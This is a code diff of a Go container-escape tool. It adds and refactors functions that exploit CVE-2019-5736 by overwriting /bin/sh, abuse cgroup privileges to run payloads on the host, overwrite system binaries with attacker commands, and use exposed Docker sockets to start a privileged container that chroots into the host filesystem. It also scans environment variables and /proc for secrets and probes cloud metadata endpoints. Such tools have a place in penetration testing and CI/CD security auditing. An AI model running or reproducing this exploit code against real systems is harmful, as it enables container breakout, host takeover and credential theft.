@@ -1,8 +1,11 @@
 package main
 
 import (
+	"archive/tar"
 	"bufio"
 	"bytes"
+	"compress/gzip"
+	"crypto/tls"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -12,17 +15,28 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/credentials"
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/s3/s3manager"
+	"github.com/kr/pty"
+	"github.com/tv42/httpunix"
+	"golang.org/x/crypto/ssh/terminal"
 )
 
 func abuseCgroupPriv(payload string) {
+
+	if payload == "nil" {
+		fmt.Println("[-] Please provide a payload")
+		return
+	}
 	fmt.Println("[+] Attempting to abuse CGROUP Privileges")
 	containerHome, err := execShellCmd("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
 	containerHome = strings.TrimSpace(containerHome)
@@ -88,8 +102,6 @@ func abuseCgroupPriv(payload string) {
 		exitCode = 1
 		return
 	}
-
-	// payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, strings.TrimSpace(containerHome))
 	payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, containerHome)
 
 	if *verbosePtr {
@@ -208,20 +220,20 @@ func execDocker(dockerSockPath string) error {
 	return nil
 }
 
-func autopwn() {
+func autopwn(path string, cicd bool) {
 	fmt.Println("[+] Attempting to autopwn")
-	sockets, _ := getValidSockets(*pathPtr)
+	sockets, _ := getValidSockets(path)
 	httpSockets := getHTTPEnabledSockets(sockets)
 	dockerSocks := getDockerEnabledSockets(httpSockets)
 	for _, element := range dockerSocks {
-		err := autopwnDocker(element)
+		err := autopwnDocker(element, cicd)
 		if err != nil {
 			fmt.Println("[ERROR] ", err)
 		}
 	}
 }
 
-func autopwnDocker(dockerSock string) error {
+func autopwnDocker(dockerSock string, cicd bool) error {
 	fmt.Println("[+] Attempting to autopwn: ", dockerSock)
 
 	_, err := os.Stat("docker/docker")
@@ -247,7 +259,7 @@ func autopwnDocker(dockerSock string) error {
 		fmt.Println("[*] Successfully got Docker client...")
 	}
 	fmt.Println("[+] Attempting to escape to host...")
-	if *cicdPtr {
+	if cicd {
 		if *verbosePtr {
 			fmt.Println("[+] Attempting in CICD Mode")
 		}
@@ -276,12 +288,12 @@ func huntDomainSockets() {
 	}
 }
 
-func checkEnvVars() {
+func checkEnvVars(wordlist string) {
 	fmt.Println("[+] Checking ENV Variables for secrets")
 	var terms []string
 	var err error
-	if *wordlistPtr != "nil" {
-		terms, err = getLinesFromFile(*wordlistPtr)
+	if wordlist != "nil" {
+		terms, err = getLinesFromFile(wordlist)
 		if err != nil {
 			panic(err)
 		}
@@ -290,7 +302,7 @@ func checkEnvVars() {
 	}
 
 	for _, envVar := range os.Environ() {
-		if checkForJuicyDeets(envVar, terms) {
+		if checkForJuicyDeets(wordlist, envVar, terms) {
 			fmt.Println("[!] Sensitive Keyword found in ENV: ", envVar)
 			exitCode = 2
 		}
@@ -298,7 +310,7 @@ func checkEnvVars() {
 
 }
 
-func checkProcEnviron() {
+func checkProcEnviron(wordlist string) {
 	fmt.Println("[+] Searching /proc/* for data")
 	files, err := ioutil.ReadDir("/proc")
 	if err != nil {
@@ -307,8 +319,8 @@ func checkProcEnviron() {
 	}
 
 	var terms []string
-	if *wordlistPtr != "nil" {
-		terms, err = getLinesFromFile(*wordlistPtr)
+	if wordlist != "nil" {
+		terms, err = getLinesFromFile(wordlist)
 		if err != nil {
 			panic(err)
 		}
@@ -331,7 +343,7 @@ func checkProcEnviron() {
 					fmt.Println("[ERROR] Could not query environ for-> ", environFile)
 				}
 			}
-			if checkForJuicyDeets(output, terms) {
+			if checkForJuicyDeets(wordlist, output, terms) {
 				fmt.Printf("[!] Sensitive keyword found in: %s -> '%s'\n", environFile, output)
 				exitCode = 2
 			}
@@ -339,14 +351,13 @@ func checkProcEnviron() {
 	}
 }
 
-func checkForJuicyDeets(data string, terms []string) bool {
-	if *wordlistPtr != "nil" {
+func checkForJuicyDeets(wordlist string, data string, terms []string) bool {
+	if wordlist != "nil" {
 		for _, term := range terms {
 			if strings.Contains(strings.ToLower(data), strings.ToLower(term)) {
 				return true
 			}
 		}
-
 	} else {
 		if strings.Contains(strings.ToLower(data), "password") || strings.Contains(strings.ToLower(data), "secret") {
 			return true
@@ -385,16 +396,13 @@ func performHttpGetRequest(url string) (int, error) {
 	if err != nil {
 		return 0, err
 	}
-
 	defer resp.Body.Close()
-
 	return resp.StatusCode, nil
 }
 
-func checkMetadataServices() {
-
-	if *endpointList != "nil" {
-		endpoints, err := getLinesFromFile(*endpointList)
+func checkMetadataServices(endpointList string) {
+	if endpointList != "nil" {
+		endpoints, err := getLinesFromFile(endpointList)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -409,18 +417,21 @@ func checkMetadataServices() {
 		if queryEndpoint("http://169.254.169.254/") {
 			exitCode = 1
 		}
-		if queryEndpoint("http://kubernetes.default.svc/") {
-			exitCode = 1
-		}
 	}
 }
 
-func runcPwn(command string) {
+func runcPwn(hijackCommand string) {
+
+	if hijackCommand == "nil" {
+		fmt.Println("[-] Please provide a payload")
+		return
+	}
+
 	//This code has been pretty much copy+pasted from the great work done by Nick Frichetten
 	//https://github.com/Frichetten/CVE-2019-5736-PoC
 	fmt.Println("[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...")
-	payload := fmt.Sprintf("#!/bin/bash \n %s", command)
-	fmt.Println("[+] Attempting to exploit CVE-2019-5736 with command: ", command)
+	payload := fmt.Sprintf("#!/bin/bash \n %s", hijackCommand)
+	fmt.Println("[+] Attempting to exploit CVE-2019-5736 with command: ", hijackCommand)
 	fd, err := os.Create("/bin/sh")
 	if err != nil {
 		fmt.Println(err)
@@ -526,15 +537,20 @@ func processCmdLine() {
 
 func hijackBinaries(hijackCommand string) {
 
-	fmt.Println("[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...")
-	fmt.Println("[+] Attempting to hijack binaries")
-	fmt.Println("[*] Command to be used: ", hijackCommand)
-	command := fmt.Sprintf("#!/bin/sh \n %s \n", hijackCommand)
+	if hijackCommand != "nil" {
+		fmt.Println("[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...")
+		fmt.Println("[+] Attempting to hijack binaries")
+		fmt.Println("[*] Command to be used: ", hijackCommand)
+		command := fmt.Sprintf("#!/bin/sh \n %s \n", hijackCommand)
 
-	hijackDirectory("/bin", command)
-	hijackDirectory("/sbin", command)
-	hijackDirectory("/usr/bin", command)
-	hijackDirectory("/usr/sbin", command)
+		hijackDirectory("/bin", command)
+		hijackDirectory("/sbin", command)
+		hijackDirectory("/usr/bin", command)
+		hijackDirectory("/usr/sbin", command)
+	} else {
+		fmt.Println("[-] Please provide a payload")
+	}
+
 }
 
 func copyFile(src, dst string) error {
@@ -653,85 +669,18 @@ func hijackDirectory(dir, command string) {
 	}
 }
 
-func huntNetworkInterfaces() {
-	fmt.Println("[+] Attempting to get local network interfaces")
-
-	err := processInterfaces()
-	if err != nil {
-		fmt.Println("[+] Error getting local interfaces, ", err)
+func findDomainSockets(path string) {
+	fmt.Println("[+] Looking for UNIX Domain Sockets from:", path)
+	sockets, _ := getValidSockets(path)
+	for _, element := range sockets {
+		fmt.Println("[!] Valid Socket: " + element)
+		exitCode = 1
 	}
 }
 
-func getLocalInterfaces() ([]Interface, error) {
-
-	interfaces, err := net.Interfaces()
-
-	var interfaceResults []Interface
-
-	if err != nil {
-		fmt.Print(err)
-		return nil, err
-	}
-
-	for _, i := range interfaces {
-		byNameInterface, err := net.InterfaceByName(i.Name)
-		var result Interface
-		result.Name = i.Name
-		if err != nil {
-			fmt.Println(err)
-			return nil, err
-		}
-		addresses, err := byNameInterface.Addrs()
-		var addressResults []IpAddress
-		for _, v := range addresses {
-			var address IpAddress
-			address.Address = v.String()
-			addressResults = append(addressResults, address)
-		}
-		result.Addresses = addressResults
-		interfaceResults = append(interfaceResults, result)
-	}
-	return interfaceResults, nil
-}
-
-func processInterfaces() error {
-	var interfaceResults []Interface
-	interfaces, err := net.Interfaces()
-	if err != nil {
-		return err
-	}
-	for _, i := range interfaces {
-		byNameInterface, err := net.InterfaceByName(i.Name)
-		if err != nil {
-			return err
-		}
-		var result Interface
-		result.Name = i.Name
-
-		fmt.Println("[*] Got Interface: " + i.Name)
-		if err != nil {
-			return err
-		}
-		addresses, err := byNameInterface.Addrs()
-		if err != nil {
-			return err
-		}
-		var addressResults []IpAddress
-		for _, v := range addresses {
-			fmt.Println("\t[*] Got address: " + v.String())
-			var address IpAddress
-			address.Address = v.String()
-			addressResults = append(addressResults, address)
-		}
-		result.Addresses = addressResults
-		interfaceResults = append(interfaceResults, result)
-	}
-	return nil
-}
-
-func findHttpSockets() {
-	fmt.Println("[+] Looking for HTTP enabled Sockets")
-	sockets, _ := getValidSockets(*pathPtr)
+func findHttpSockets(path string) {
+	fmt.Println("[+] Looking for HTTP enabled Sockets from:", path)
+	sockets, _ := getValidSockets(path)
 	httpSockets := getHTTPEnabledSockets(sockets)
 	for _, aSock := range httpSockets {
 		fmt.Println("[!] Valid HTTP Socket:", aSock)
@@ -756,10 +705,231 @@ func findDockerD() {
 }
 
 func checkForDockerEnvSock() (string, bool) {
+	fmt.Println("[*] Looking for Docker ENV variables")
 	for _, envVar := range os.Environ() {
 		if strings.Contains(strings.ToUpper(envVar), "DOCKER_HOST") {
 			return envVar[strings.Index(envVar, "=")+1:], true
 		}
 	}
 	return "", false
+}
+
+func downloadFile(filepath string, url string) error {
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: transport}
+	resp, err := client.Get(url)
+	if err != nil {
+		return err
+	}
+
+	defer resp.Body.Close()
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+	_, err = io.Copy(out, resp.Body)
+	return err
+}
+
+func dropToTTY(dockerSockPath string) error {
+	// this code has been copy+pasted directly from https://github.com/kr/pty, it's that awesome
+	cmd := "./docker/docker -H unix://" + dockerSockPath + " run -ti --privileged --net=host --pid=host --ipc=host -v /:/host alpine:latest /bin/sh"
+	fmt.Println(cmd)
+	c := exec.Command("sh", "-c", cmd)
+
+	// Start the command with a pty.
+	ptmx, err := pty.Start(c)
+	if err != nil {
+		return err
+	}
+
+	// Make sure to close the pty at the end.
+	defer func() { _ = ptmx.Close() }() // Best effort.
+
+	// Handle pty size.
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGWINCH)
+	go func() {
+		for range ch {
+			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
+				log.Printf("error resizing pty: %s", err)
+			}
+		}
+	}()
+	ch <- syscall.SIGWINCH // Initial resize.
+	go func() {
+		ptmx.Write([]byte("chroot /host && clear\n"))
+	}()
+
+	// Set stdin in raw mode.
+	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		panic(err)
+	}
+	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
+
+	go func() {
+		ptmx.Write([]byte("echo 'You are now on the underlying host'\n"))
+	}()
+	// Copy stdin to the pty and the pty to stdout.
+	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
+	_, _ = io.Copy(os.Stdout, ptmx)
+	return nil
+}
+
+func untar(dst string, r io.Reader) error {
+	// this code has been copy pasted from this great gist https://gist.github.com/sdomino/635a5ed4f32c93aad131#file-untargz-go
+	gzr, err := gzip.NewReader(r)
+	if err != nil {
+		return err
+	}
+	defer gzr.Close()
+	tr := tar.NewReader(gzr)
+	for {
+		header, err := tr.Next()
+		switch {
+		// if no more files are found return
+		case err == io.EOF:
+			return nil
+		// return any other error
+		case err != nil:
+			return err
+		// if the header is nil, just skip it (not sure how this happens)
+		case header == nil:
+			continue
+		}
+		// the target location where the dir/file should be created
+		target := filepath.Join(dst, header.Name)
+		// check the file type
+		switch header.Typeflag {
+
+		// if its a dir and it doesn't exist create it
+		case tar.TypeDir:
+			if _, err := os.Stat(target); err != nil {
+				if err := os.MkdirAll(target, 0755); err != nil {
+					return err
+				}
+			}
+		// if it's a file create it
+		case tar.TypeReg:
+			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
+			if err != nil {
+				return err
+			}
+			// copy over contents
+			if _, err := io.Copy(f, tr); err != nil {
+				return err
+			}
+			// manually close here after each file operation; defering would cause each file close
+			// to wait until all operations have completed.
+			f.Close()
+		}
+	}
+}
+
+func getDockerEnabledSockets(socks []string) []string {
+	fmt.Println("[+] Hunting Docker Socks")
+	var dockerSocks []string
+	for _, element := range socks {
+		resp, err := checkSock(element)
+		if err == nil {
+			if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
+				dockerSocks = append(dockerSocks, element)
+				if *verbosePtr {
+					fmt.Println("[+] Valid Docker Socket: " + element)
+				}
+			} else {
+				if *verbosePtr {
+					fmt.Println("[+] Invalid Docker Socket: " + element)
+				}
+			}
+			defer resp.Body.Close()
+		} else {
+			if *verbosePtr {
+				fmt.Println("[+] Invalid Docker Socket: " + element)
+			}
+		}
+	}
+	return dockerSocks
+}
+
+func getHTTPEnabledSockets(socks []string) []string {
+	var httpSocks []string
+	for _, element := range socks {
+		_, err := checkSock(element)
+		if err == nil {
+			httpSocks = append(httpSocks, element)
+			if *verbosePtr {
+				fmt.Println("[+] Valid HTTP Socket: " + element)
+			}
+		} else {
+			if *verbosePtr {
+				fmt.Println("[+] Invalid HTTP Socket: " + element)
+			}
+		}
+	}
+	return httpSocks
+}
+
+func walkpath(path string, info os.FileInfo, err error) error {
+	if err != nil {
+		if *verbosePtr {
+			fmt.Println("[ERROR]: ", err)
+		}
+	} else {
+		switch mode := info.Mode(); {
+		case mode&os.ModeSocket != 0:
+			validSocks = append(validSocks, path)
+		default:
+			if *verbosePtr {
+				fmt.Println("[*] Invalid Socket: " + path)
+			}
+		}
+	}
+	return nil
+}
+
+func getValidSockets(startPath string) ([]string, error) {
+	validSocks = nil
+	err := filepath.Walk(startPath, walkpath)
+	if err != nil {
+		if *verbosePtr {
+			fmt.Println("[ERROR]: ", err)
+		}
+		return nil, err
+	}
+	return validSocks, nil
+}
+
+func checkSock(path string) (*http.Response, error) {
+	if *verbosePtr {
+		fmt.Println("[-] Checking Sock for HTTP: " + path)
+	}
+
+	u := &httpunix.Transport{
+		DialTimeout:           100 * time.Millisecond,
+		RequestTimeout:        1 * time.Second,
+		ResponseHeaderTimeout: 1 * time.Second,
+	}
+	u.RegisterLocation("dockerd", path)
+	var client = http.Client{
+		Transport: u,
+	}
+	resp, err := client.Get("http+unix://dockerd/info")
+
+	if resp == nil {
+		return nil, err
+	}
+	return resp, nil
+}
+
+func debug(data []byte, err error) {
+	if err == nil {
+		fmt.Printf("%s\n\n", data)
+	} else {
+		log.Fatalf("%s\n\n", err)
+	}
 }
